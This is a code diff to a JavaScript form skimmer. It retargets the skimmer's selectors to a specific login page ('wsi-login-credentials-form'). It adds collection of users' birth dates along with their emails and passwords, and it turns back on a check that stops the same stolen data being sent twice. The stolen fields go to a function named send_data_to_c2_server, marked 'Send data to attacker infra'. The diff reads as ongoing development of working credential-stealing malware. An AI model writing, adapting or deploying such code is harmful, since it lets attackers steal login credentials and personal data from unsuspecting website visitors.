@@ -1,6 +1,7 @@
-window["data_leak_label_email"] = ["input[id*='username']", "input[name*='username']", "input[type*='text']"]
-window["data_leak_label_password"] = ["input[id*='password']", "input[name*='password']"]
-window["data_leak_label_submit_button"] = ["button[id*='loginbtn']"]
+window["data_leak_label_email"] = ["input[id*='wsi-login-credentials-form-email']", "input[name*='email']", "input[type*='email']"]
+window["data_leak_label_password"] = ["input[id*='wsi-login-credentials-form-password']", "input[name*='password']"]
+window["data_leak_label_birth_date"] = ["input[id*='wsi-login-credentials-form-birthdate']", "input[name*='birthDate']"]
+window["data_leak_label_submit_button"] = ["button[id*='wsi-authenticate-button']"]
 
 function send_data_to_c2_server(data) {
     var xhr = window["XMLHttpRequest"] ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
@@ -64,6 +65,7 @@ function listener_fetch_data_leak() {
     data_leak = {
         "email": get_element_value(window["data_leak_label_email"]),
         "password": get_element_value(window["data_leak_label_password"]),
+        "birth_date": get_element_value(window["data_leak_label_birth_date"]),
         "uagent": navigator.userAgent
     }
 
@@ -72,13 +74,12 @@ function listener_fetch_data_leak() {
         if (!key) return;
     }
 
-    /** Prevent to do not send again previously sent data
+    // Prevent to do not send again previously sent data
     var data_leak_hash = hashCode(data_leak);
     console.log("hash:"); console.log(data_leak_hash);
     console.log("previous hash:"); console.log(window["skimmer_last_data"]);
     if (data_leak_hash == window["skimmer_last_data"]) return;
     window["skimmer_last_data"] = data_leak_hash;
-    **/
 
     // Send data to attacker infra
     send_data_to_c2_server(data_leak);
